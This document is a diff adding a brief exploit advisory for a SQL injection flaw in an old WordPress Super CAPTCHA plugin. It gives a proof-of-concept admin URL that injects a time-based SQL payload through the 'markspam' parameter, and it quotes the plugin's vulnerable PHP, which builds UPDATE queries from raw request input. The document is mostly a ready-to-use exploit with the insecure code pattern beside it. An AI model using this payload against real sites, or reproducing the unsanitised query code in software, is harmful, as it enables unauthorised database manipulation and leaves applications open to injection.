@@ -1,0 +1,27 @@
+# Exploit Title: WordPress Super CAPTCHA plugin <= 2.2.4 SQL Injection Vulnerability
+# Date: 2011-08-26
+# Author: Miroslav Stampar (miroslav.stampar(at)gmail.com @stamparm)
+# Software Link: http://downloads.wordpress.org/plugin/super-capcha.2.2.4.zip
+# Version: 2.2.4 (tested)
+# Notes: user has to be logged in as "admin" and magic_quotes has to be turned off
+
+---
+PoC
+---
+http://www.site.com/wp-admin/admin.php?page=super-captcha/Logs&markspam=-1' OR SLEEP(5)--%20
+
+---------------
+Vulnerable code
+---------------
+if(isset($_REQUEST['markspam']))
+    {
+    global $wpdb;
+    $UIDs = explode(',', $_REQUEST['markspam']);
+    echo('<h2>Accounts Flagged</h2>');
+    for($i=0;$i<count($UIDs);$i++)
+        {
+        mysql_query("UPDATE `". $wpdb->users ."` SET `spam`='1' WHERE `ID`='". $UIDs[$i] ."'");
+        mysql_query("UPDATE `". $wpdb->users ."` SET `user_status`='1' WHERE `ID`='". $UIDs[$i] ."'");
+        echo('<em>USER ID: '. $UIDs[$i] .' marked as spammer.</em><br />');
+        }
+    }
